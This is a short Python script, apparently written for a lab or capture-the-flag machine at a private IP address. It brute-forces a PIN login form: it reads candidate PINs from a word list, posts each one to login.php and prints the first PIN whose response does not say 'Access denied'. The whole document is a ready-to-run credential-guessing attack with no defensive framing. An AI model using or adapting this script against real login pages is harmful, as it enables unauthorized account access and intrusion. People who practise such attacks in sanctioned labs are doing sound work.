#!/usr/bin/env python3
import requests

url = 'http://10.10.136.61:8000/login.php'

def login(pin):
  r = requests.post(url, data = { "pin": pin }, allow_redirects=True)
  return r

#print(login("123").text)
with open("pw.lst", "r") as h:
  pins = [ line.strip() for line in h.read().split("\n") if line ]

for pin in pins:
  res = login(pin).text
  data = res.split('<h1 class="text-5xl text-red">')[-1]
  data = data.split('</h1>')[0]
  if data != "Access denied":
    print(f"The PIN is: {pin}")
    break
